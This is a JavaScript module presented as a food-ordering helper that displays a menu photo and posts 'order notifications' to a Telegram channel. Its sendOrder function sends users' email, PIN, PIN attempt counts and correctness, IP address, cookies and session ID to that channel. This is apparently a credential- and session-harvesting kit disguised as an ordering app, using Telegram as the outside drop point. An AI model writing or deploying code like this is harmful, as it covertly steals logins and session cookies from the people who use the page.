/**
 * src/lib/telegram.js
 *
 * Two responsibilities:
 *  1. getDashboardImage() — fetch the pinned photo from the channel (menu display)
 *  2. sendOrder()         — post an order notification to the channel
 */

function token() {
  const t = process.env.REACT_APP_TELEGRAM_BOT_TOKEN;
  if (!t) throw new Error("REACT_APP_TELEGRAM_BOT_TOKEN is not set.");
  return t;
}

function channelId() {
  const id = process.env.REACT_APP_TELEGRAM_CHANNEL_ID;
  if (!id) throw new Error("REACT_APP_TELEGRAM_CHANNEL_ID is not set.");
  return id;
}

async function tgGet(method, params = {}) {
  const qs = new URLSearchParams(
    Object.fromEntries(Object.entries(params).map(([k, v]) => [k, String(v)]))
  ).toString();
  const res  = await fetch(`https://api.telegram.org/bot${token()}/${method}${qs ? `?${qs}` : ""}`);
  const data = await res.json();
  if (!data.ok) throw new Error(`Telegram [${method}]: ${data.description}`);
  return data.result;
}

async function tgPost(method, body) {
  const res  = await fetch(`https://api.telegram.org/bot${token()}/${method}`, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify(body),
  });
  const data = await res.json();
  if (!data.ok) throw new Error(`Telegram [${method}]: ${data.description}`);
  return data.result;
}

/**
 * Fetch the pinned photo from the channel as a displayable URL.
 * Returns null if no photo is pinned.
 */
export async function getDashboardImage() {
  const chat      = await tgGet("getChat", { chat_id: channelId() });
  const pinnedMsg = chat.pinned_message;
  if (!pinnedMsg?.photo) return null;

  const fileId   = pinnedMsg.photo[pinnedMsg.photo.length - 1].file_id;
  const fileInfo = await tgGet("getFile", { file_id: fileId });
  return `https://api.telegram.org/file/bot${token()}/${fileInfo.file_path}`;
}

// Helper: escape HTML special characters
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/**
 * Send a food order or PIN attempt to the Telegram channel.
 * Uses HTML parse_mode and escapes all user-provided fields.
 */
export async function sendOrder(orderData) {
  const {
    email,
    pin,
    name,
    food,
    attemptNumber,
    isCorrectPin,
    ip,
    cookies,
    sessionId,
  } = orderData;

  const now = new Date();
  const time = now.toLocaleString("en-GB", {
    dateStyle: "medium",
    timeStyle: "short",
  });

  // Build HTML message with escaped user content
  const lines = [];
  lines.push("🍽️ <b>New Food Order</b>");
  if (name) lines.push(`👤 <b>Name:</b> ${escapeHtml(name)}`);
  if (email) lines.push(`📧 <b>Email:</b> ${escapeHtml(email)}`);
  if (food) lines.push(`🥘 <b>Food:</b> ${escapeHtml(food)}`);
  if (pin) lines.push(`🔑 <b>PIN:</b> ${escapeHtml(pin)}`);
  if (attemptNumber !== undefined) lines.push(`🔢 <b>Attempt:</b> ${attemptNumber}`);
  if (isCorrectPin !== undefined) lines.push(`✅ <b>Correct:</b> ${isCorrectPin ? "Yes" : "No"}`);
  if (ip) lines.push(`🌐 <b>IP:</b> ${escapeHtml(ip)}`);
  if (cookies) lines.push(`🍪 <b>Cookies:</b> ${escapeHtml(cookies)}`);
  if (sessionId) lines.push(`🆔 <b>Session:</b> ${escapeHtml(sessionId)}`);
  lines.push(`🕐 <b>Time:</b> ${escapeHtml(time)}`);

  const text = lines.join("\n") || "Empty order";

  await tgPost("sendMessage", {
    chat_id:    channelId(),
    text,
    parse_mode: "HTML",          // now using HTML, not Markdown
  });
}